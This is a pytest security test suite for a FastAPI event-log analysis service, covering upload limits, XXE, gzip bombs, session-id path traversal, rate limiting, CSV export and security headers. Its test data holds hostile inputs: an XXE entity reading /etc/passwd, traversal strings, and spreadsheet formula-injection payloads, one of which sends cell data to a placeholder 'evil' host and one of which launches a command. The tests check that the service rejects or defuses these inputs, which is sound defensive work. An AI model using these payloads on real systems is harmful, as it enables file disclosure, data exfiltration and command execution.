from __future__ import annotations

import io
import os
import time
from unittest.mock import patch
import pytest
from fastapi.testclient import TestClient

SAMPLE_XES = (
    b'<?xml version="1.0" encoding="UTF-8"?>'
    b'<log xes.version="1.0"><trace>'
    b'<string key="concept:name" value="c1"/>'
    b'<event><string key="concept:name" value="a"/>'
    b'<date key="time:timestamp" value="2024-01-01T00:00:00.000+00:00"/></event>'
    b'<event><string key="concept:name" value="b"/>'
    b'<date key="time:timestamp" value="2024-01-01T01:00:00.000+00:00"/></event>'
    b'</trace></log>'
)



def test_upload_invalid_extension(client, stub_algorithm):
    # Try uploading a .exe file
    r = client.post(
        f"/algorithms/{stub_algorithm}/analyze",
        files={"file": ("malicious.exe", b"binarycontent", "application/octet-stream")},
    )
    assert r.status_code == 400
    assert "Invalid file extension" in r.json()["detail"]


def test_upload_size_limit_exceeded(client, stub_algorithm):
    # We patch MAX_FILE_SIZE to 10 bytes to test limit enforcement without uploading 100MB
    with patch("routes.algorithms.MAX_FILE_SIZE", 10):
        r = client.post(
            f"/algorithms/{stub_algorithm}/analyze",
            files={"file": ("sample.xes", b"this content is longer than 10 bytes", "application/xml")},
            )
        assert r.status_code == 400
        assert "exceeds" in r.json()["detail"]


def test_upload_xxe_doctype_rejected(client, stub_algorithm):
    # XML payload containing DOCTYPE (commonly used in XXE)
    xxe_xml = b"""<?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE log [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <log>
        <trace name="case_1"/>
    </log>
    """
    r = client.post(
        f"/algorithms/{stub_algorithm}/analyze",
        files={"file": ("xxe.xml", xxe_xml, "application/xml")},
    )
    assert r.status_code == 400
    assert "DOCTYPE declarations are not allowed" in r.json()["detail"]


def test_upload_safe_xml_accepted(client, stub_algorithm):
    # XML payload without DOCTYPE should pass security checks (fails later at coercion or parsing if not XES, but must not be blocked by XML shield)
    safe_xml = b"""<?xml version="1.0" encoding="utf-8"?>
    <log>
        <trace name="case_1"/>
    </log>
    """
    # Using an invalid algorithm key or parameters so we can intercept the validation code path
    # If the shield passes, it will proceed to coercion / job execution
    r = client.post(
        f"/algorithms/{stub_algorithm}/analyze",
        files={"file": ("safe.xml", safe_xml, "application/xml")},
        data={"top_k": "invalid_int_to_trigger_400_after_xml_check"},
    )
    # The status should be 400 because of the coercion failure (invalid_int), which indicates it passed the XML security shield successfully!
    assert r.status_code == 400
    detail = r.json()["detail"]
    assert detail["type"] == "validation_error"
    assert "top_k" in detail["errors"]
    assert "integer" in detail["errors"]["top_k"]


# --- hostile uploads and session ids -----------------------------------------------------


def test_gzip_bomb_is_refused_before_it_expands():
    """A .xes.gz well inside the 100 MB upload limit must not expand without bound.

    The upload check counts compressed bytes, and XES compresses 200:1 or more.
    """
    import gzip
    import tempfile

    from algorithms._log_io import MAX_DECOMPRESSED_BYTES, read_event_log

    with tempfile.NamedTemporaryFile(suffix=".xes.gz", delete=False) as fh:
        path = fh.name
    try:
        payload = b"\0" * (1024 * 1024)
        with gzip.open(path, "wb", compresslevel=9) as gz:
            for _ in range((MAX_DECOMPRESSED_BYTES // len(payload)) + 8):
                gz.write(payload)
        assert os.path.getsize(path) < 10 * 1024 * 1024, "test file should be small compressed"

        with pytest.raises(ValueError, match="expands beyond"):
            read_event_log(path)
    finally:
        os.remove(path)


def test_ordinary_gzipped_log_still_reads():
    """A normal gzipped log is still accepted."""
    import gzip
    import shutil
    import tempfile

    from algorithms._log_io import read_event_log

    source = os.path.join(os.path.dirname(__file__), "..", "sample_logs", "sepsis_cases_mini.xes")
    with tempfile.NamedTemporaryFile(suffix=".xes.gz", delete=False) as fh:
        path = fh.name
    try:
        with open(source, "rb") as src, gzip.open(path, "wb") as dst:
            shutil.copyfileobj(src, dst)
        df = read_event_log(path)
        assert len(df) > 0
        assert len(read_event_log(path, return_legacy=True)) > 0
    finally:
        os.remove(path)


@pytest.mark.parametrize("hostile", ["../..", "../../etc", "..", "/etc", "not-a-uuid"])
def test_malformed_session_id_is_replaced_not_used_as_a_path(hostile):
    """The session id is a directory component and must never leave its parent.

    It arrives in a signed cookie, but a leaked signing key turns it into attacker input, and
    `UPLOADED_LOGS_DIR / "../.."` resolves to the filesystem root. Job ids were validated,
    session ids were not.
    """
    import asyncio
    import uuid as uuid_mod
    from unittest.mock import AsyncMock, MagicMock, patch

    from config import get_session_id

    request = MagicMock()
    request.session = {"session_id": hostile}

    with patch.dict("sys.modules", {"jobs_db": MagicMock(get_or_create_session=AsyncMock())}):
        resolved = asyncio.run(get_session_id(request))

    assert resolved != hostile
    uuid_mod.UUID(resolved)  # raises if it is not a well-formed UUID


def test_job_quota_rejects_when_the_session_is_already_full(client, monkeypatch, stub_algorithm):
    """One session must not be able to fill the queue and starve everyone else.

    Rate limits count requests per hour; this counts what is actually in flight. A batch
    request is one job but up to 10 runs, and Celery processes four at a time, so the queue
    is the contended resource.
    """
    import jobs_db

    async def _full(_session_id):
        return jobs_db.MAX_ACTIVE_JOBS_PER_SESSION

    monkeypatch.setattr(jobs_db, "count_active_jobs", _full)

    r = client.post(
        f"/algorithms/{stub_algorithm}/analyze",
        files={"file": ("sample.xes", b"<log/>", "application/xml")},
    )
    assert r.status_code == 429, r.text
    assert "queued or running" in r.json()["detail"]


def test_job_quota_allows_a_normal_run(client, monkeypatch, stub_algorithm):
    """Guard against the quota being so tight that ordinary use breaks."""
    import jobs_db

    async def _idle(_session_id):
        return 0

    monkeypatch.setattr(jobs_db, "count_active_jobs", _idle)

    r = client.post(
        f"/algorithms/{stub_algorithm}/analyze",
        files={"file": ("sample.xes", SAMPLE_XES, "application/xml")},
    )
    assert r.status_code == 200, r.text


# --- rate limiting must count per client, not per proxy ------------------------------

def _request_with(peer: str, forwarded: str | None):
    from unittest.mock import MagicMock

    request = MagicMock()
    request.client.host = peer
    request.headers = {"x-forwarded-for": forwarded} if forwarded else {}
    return request


def test_rate_limit_key_warns_when_the_proxy_header_is_ignored(caplog):
    """Warn when X-Forwarded-For is ignored and all callers share one rate-limit key."""
    import config

    config._proxy_misconfig_warned = False
    with caplog.at_level("WARNING"):
        key = config.rate_limit_key(_request_with("172.28.0.10", "203.0.113.7"))

    assert key == "172.28.0.10"  # everyone shares this key
    assert "not per-client" in caplog.text
    assert "FORWARDED_ALLOW_IPS" in caplog.text


def test_rate_limit_key_is_quiet_when_the_proxy_header_was_applied(caplog):
    """With uvicorn configured, client.host is the forwarded address and nothing is logged."""
    import config

    config._proxy_misconfig_warned = False
    with caplog.at_level("WARNING"):
        key = config.rate_limit_key(_request_with("203.0.113.7", "203.0.113.7, 172.28.0.10"))

    assert key == "203.0.113.7"
    assert caplog.text == ""


def test_rate_limit_key_warns_only_once_per_process(caplog):
    """A per-request warning on a misconfigured deployment is its own denial of service."""
    import config

    config._proxy_misconfig_warned = False
    config.rate_limit_key(_request_with("172.28.0.10", "203.0.113.7"))
    caplog.clear()  # caplog collects outside at_level too; drop the first, expected warning
    with caplog.at_level("WARNING"):
        config.rate_limit_key(_request_with("172.28.0.10", "203.0.113.8"))

    assert caplog.text == ""


def test_rate_limit_key_without_any_proxy(caplog):
    """Direct access (local development) must not warn about a proxy that is not there."""
    import config

    config._proxy_misconfig_warned = False
    with caplog.at_level("WARNING"):
        key = config.rate_limit_key(_request_with("127.0.0.1", None))

    assert key == "127.0.0.1"
    assert caplog.text == ""


# --- CSV cells from log content must not be executed by a spreadsheet ------------------

@pytest.mark.parametrize("hostile", [
    '=HYPERLINK("http://evil/"&A1,"click")',
    "+1+1",
    "@SUM(A1:A9)",
    "-2+3+cmd|' /C calc'!A0",
    "\t=1+1",
    "\r=1+1",
])
def test_csv_cell_defuses_formulas(hostile):
    """Activity names reach exported tables unchanged, so a log can carry a formula."""
    from zip_export import csv_cell

    out = csv_cell(hostile)
    # Quoting may wrap it, but the payload must no longer start a formula.
    assert out.lstrip('"').startswith("'"), out


@pytest.mark.parametrize("value", ["-5", "-3.14", "+7", "0", "1e5", "-0.0"])
def test_csv_cell_leaves_numbers_alone(value):
    """Prefixing negative numbers would corrupt every export containing one."""
    from zip_export import csv_cell

    assert csv_cell(value) == value


def test_csv_cell_still_quotes_what_csv_requires():
    from zip_export import csv_cell

    assert csv_cell('a,b') == '"a,b"'
    assert csv_cell('say "hi"') == '"say ""hi"""'
    assert csv_cell(None) == ""
    assert csv_cell(42) == "42"


# --- /health is unauthenticated and must not describe the database ---------------------

def test_health_does_not_leak_database_details(client):
    """asyncpg errors name host, port, database and user. The log gets them, the caller does not."""
    from unittest.mock import MagicMock, patch

    leak = 'connection to server at "db.internal" (10.0.0.5), port 5432 failed: ' \
           'password authentication failed for user "complexity_admin"'

    with patch("routes.health.AsyncSessionLocal", MagicMock(side_effect=RuntimeError(leak))):
        r = client.get("/health")

    assert r.status_code == 500
    body = r.text
    assert r.json()["detail"] == "Database unavailable"
    for secret in ("db.internal", "10.0.0.5", "5432", "complexity_admin"):
        assert secret not in body, f"/health leaked {secret!r}"


# --- scratch files and abandoned sessions must not accumulate forever ------------------

def test_leaked_scratch_file_is_eventually_removed(tmp_path, monkeypatch):
    """A hard-killed worker leaves its tmp file behind; the count rule never sees it.

    The `tmp` exclusion protects the file a running job is reading, so the age rule
    handles leftovers.
    """
    from routes import algorithms as algo

    monkeypatch.setattr(algo, "UPLOADED_LOGS_DIR", tmp_path)
    session = tmp_path / "s1"
    session.mkdir()

    leaked = session / "tmpabcdef.xes"
    leaked.write_bytes(b"<log/>")
    old = time.time() - algo.TMP_FILE_MAX_AGE_S - 60
    os.utime(leaked, (old, old))

    in_use = session / "tmpfedcba.xes"
    in_use.write_bytes(b"<log/>")

    algo.cleanup_uploaded_logs("s1")

    assert not leaked.exists(), "the leaked scratch file survived cleanup"
    assert in_use.exists(), "cleanup deleted a scratch file a running job may still be reading"


def test_uploads_are_still_capped_by_count(tmp_path, monkeypatch):
    """The age rule must not have replaced the retention rule."""
    from routes import algorithms as algo

    monkeypatch.setattr(algo, "UPLOADED_LOGS_DIR", tmp_path)
    session = tmp_path / "s1"
    session.mkdir()
    for i in range(14):
        p = session / f"log_{i:02d}.xes"
        p.write_bytes(b"<log/>")
        os.utime(p, (1_000_000 + i, 1_000_000 + i))

    algo.cleanup_uploaded_logs("s1")

    remaining = sorted(p.name for p in session.iterdir())
    assert len(remaining) == 10
    assert "log_13.xes" in remaining and "log_00.xes" not in remaining


def test_abandoned_session_directory_is_removed(tmp_path, monkeypatch):
    """cleanup_uploaded_logs only ever runs for the session that is uploading.

    Nothing iterated the parent directory, so a session nobody returns to kept its files
    forever. Active sessions must survive this.
    """
    from routes import algorithms as algo

    monkeypatch.setattr(algo, "UPLOADED_LOGS_DIR", tmp_path)

    stale = tmp_path / "11111111-1111-1111-1111-111111111111"
    stale.mkdir()
    f = stale / "old.xes"
    f.write_bytes(b"<log/>")
    long_ago = time.time() - algo.SESSION_DIR_MAX_IDLE_S - 3600
    os.utime(f, (long_ago, long_ago))
    os.utime(stale, (long_ago, long_ago))

    active = tmp_path / "22222222-2222-2222-2222-222222222222"
    active.mkdir()
    (active / "fresh.xes").write_bytes(b"<log/>")

    removed = algo.cleanup_orphaned_session_dirs()

    assert removed == 1
    assert not stale.exists()
    assert active.exists(), "cleanup removed a session that was in use"


# --- one batch request must not add up to a gigabyte -----------------------------------

def test_batch_enforces_a_total_size_budget(client, monkeypatch, stub_algorithm):
    """Ten files under the per-file limit must not add up to 1 GB per request.

    The budget is patched down so the test does not need large uploads.
    """
    import jobs_db
    from routes import algorithms as algo

    async def _idle(_session_id):
        return 0

    monkeypatch.setattr(jobs_db, "count_active_jobs", _idle)
    monkeypatch.setattr(algo, "BATCH_MAX_TOTAL_BYTES", len(SAMPLE_XES) + 10)

    r = client.post(
        f"/algorithms/{stub_algorithm}/batch",
        files=[
            ("files", ("a.xes", SAMPLE_XES, "application/xml")),
            ("files", ("b.xes", SAMPLE_XES, "application/xml")),
        ],
    )
    assert r.status_code == 400, r.text
    assert "total limit" in r.json()["detail"]


def test_batch_still_accepts_a_reasonable_request(client, monkeypatch, stub_algorithm):
    """Guard against the budget being so tight that ordinary batches break."""
    import jobs_db

    async def _idle(_session_id):
        return 0

    monkeypatch.setattr(jobs_db, "count_active_jobs", _idle)

    r = client.post(
        f"/algorithms/{stub_algorithm}/batch",
        files=[
            ("files", ("a.xes", SAMPLE_XES, "application/xml")),
            ("files", ("b.xes", SAMPLE_XES, "application/xml")),
        ],
    )
    assert r.status_code == 200, r.text


# --- the baseline headers must not depend on the reverse proxy ------------------------

def test_security_headers_are_set_by_the_application(client):
    """The headers must not depend on the nginx template."""
    r = client.get("/health")

    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert r.headers["X-Frame-Options"] == "DENY"
    assert r.headers["Referrer-Policy"] == "no-referrer"
    # API responses are JSON and downloads and never load anything.
    assert "default-src 'none'" in r.headers["Content-Security-Policy"]


def test_hsts_is_not_sent_without_tls(client, monkeypatch):
    """Sending HSTS from a plain-http deployment would lock browsers out of it."""
    monkeypatch.delenv("SESSION_COOKIE_SECURE", raising=False)
    r = client.get("/health")
    assert "Strict-Transport-Security" not in r.headers


# --- operator-tunable limits -------------------------------------------------------------

def test_rate_limit_reads_the_environment(monkeypatch):
    import env_config

    monkeypatch.setenv("RATE_LIMIT_BATCH", "3/hour")
    assert env_config.rate_limit("batch", "20/hour") == "3/hour"
    assert env_config.OVERRIDES["RATE_LIMIT_BATCH"] == "3/hour"


def test_rate_limit_falls_back_to_the_default_when_unset(monkeypatch):
    import env_config

    monkeypatch.delenv("RATE_LIMIT_BATCH", raising=False)
    assert env_config.rate_limit("batch", "20/hour") == "20/hour"


@pytest.mark.parametrize("bad", ["20", "20/fortnight", "many/hour", "", "  ", "-5/hour"])
def test_malformed_rate_limit_stops_the_service(monkeypatch, bad):
    """A malformed limit raises instead of silently keeping the default.

    Empty values count as "not configured".
    """
    import env_config

    monkeypatch.setenv("RATE_LIMIT_BATCH", bad)
    if not bad.strip():
        assert env_config.rate_limit("batch", "20/hour") == "20/hour"
        return
    with pytest.raises(env_config.ConfigError, match="RATE_LIMIT_BATCH"):
        env_config.rate_limit("batch", "20/hour")


def test_rate_limit_accepts_the_verbose_slowapi_form(monkeypatch):
    import env_config

    monkeypatch.setenv("RATE_LIMIT_ANALYZE", "5 per minute")
    assert env_config.rate_limit("analyze", "60/hour") == "5 per minute"


def test_job_quota_is_tunable(monkeypatch):
    """MAX_ACTIVE_JOBS_PER_SESSION can be set from the environment."""
    import env_config

    monkeypatch.setenv("MAX_ACTIVE_JOBS_PER_SESSION", "3")
    assert env_config.positive_int("MAX_ACTIVE_JOBS_PER_SESSION", 12) == 3


@pytest.mark.parametrize("bad", ["nope", "0", "-1", "3.5"])
def test_malformed_job_quota_stops_the_service(monkeypatch, bad):
    import env_config

    monkeypatch.setenv("MAX_ACTIVE_JOBS_PER_SESSION", bad)
    with pytest.raises(env_config.ConfigError):
        env_config.positive_int("MAX_ACTIVE_JOBS_PER_SESSION", 12)


def test_configured_limit_reaches_the_endpoint(monkeypatch):
    """End-to-end: the decorators must read the variable, not just the helper.

    The decorators are evaluated at import time, so the modules are reimported.
    """
    import importlib
    import sys

    monkeypatch.setenv("RATE_LIMIT_ANALYZE", "7/hour")
    for mod in ("routes.algorithms", "config", "env_config", "jobs_db"):
        sys.modules.pop(mod, None)

    import env_config as fresh_env  # noqa: F401
    import routes.algorithms  # noqa: F401

    assert fresh_env.OVERRIDES.get("RATE_LIMIT_ANALYZE") == "7/hour"

    # Leave the module table as we found it, or later tests import a differently-configured
    # copy of the app.
    for mod in ("routes.algorithms", "config", "env_config", "jobs_db"):
        sys.modules.pop(mod, None)
    importlib.import_module("routes.algorithms")
